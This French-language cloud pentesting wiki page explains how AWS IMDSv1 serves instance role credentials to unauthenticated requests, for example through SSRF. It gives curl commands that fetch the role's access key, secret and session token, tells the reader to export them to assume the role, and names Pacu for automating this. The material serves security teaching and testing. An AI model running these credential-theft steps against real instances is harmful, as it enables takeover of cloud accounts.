---
title: "IMDSv1 : lectures non authentifiées de credentials depuis l'endpoint de métadonnées"
description: "Lire les credentials de rôle depuis l'endpoint IMDSv1 non authentifié, souvent atteignable via un SSRF ou un point d'ancrage sur l'instance."
keywords:
  - IMDSv1
  - rôle d'instance
  - 169.254.169.254
  - SSRF
  - credentials
---

# IMDSv1

IMDSv1 répond à un simple `GET` sans jeton, sans en-tête, sans authentification. Toute requête qui atteint `169.254.169.254` depuis l'instance reçoit en retour les credentials du rôle, c'est pourquoi IMDSv1 associé à un [SSRF](ssrf.md) est le vol de credentials cloud classique.

## Lire les credentials du rôle

```bash
ROLE=$(curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/)
curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE
# -> AccessKeyId / SecretAccessKey / Token / Expiration
```

Exportez les trois valeurs (`AWS_ACCESS_KEY_ID`, `AWS_SECRET_ACCESS_KEY`, `AWS_SESSION_TOKEN`) et vous êtes désormais le rôle de l'instance.

## Notes d'exploitation

- Les credentials sont temporaires ; relisez-les avant expiration pour les rafraîchir.
- IMDSv1 est un simple GET, il est donc atteignable par des primitives SSRF qui ne peuvent pas définir d'en-têtes de requête, contrairement à [IMDSv2](imdsv2.md).
- Le même rôle est atteignable depuis une [instance EC2](../../identity/privilege-escalation/pass-role/ec2.md) passée que vous avez lancée vous-même.

## Outils

- **curl** sur l'instance, ou toute primitive de requête qui atteint l'adresse link-local.
- **Pacu** (`ec2__metadata`) : récupération automatisée depuis un shell.

## Références

- [AWS: instance metadata and user data](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-instance-metadata.html)
- [HackTricks Cloud: IMDSv1](https://cloud.hacktricks.wiki/en/pentesting-cloud/aws-security/index.html)
- [Hacking the Cloud: AWS](https://hackingthe.cloud/)
- [Stratus Red Team: AWS techniques](https://stratus-red-team.cloud/attack-techniques/AWS/)
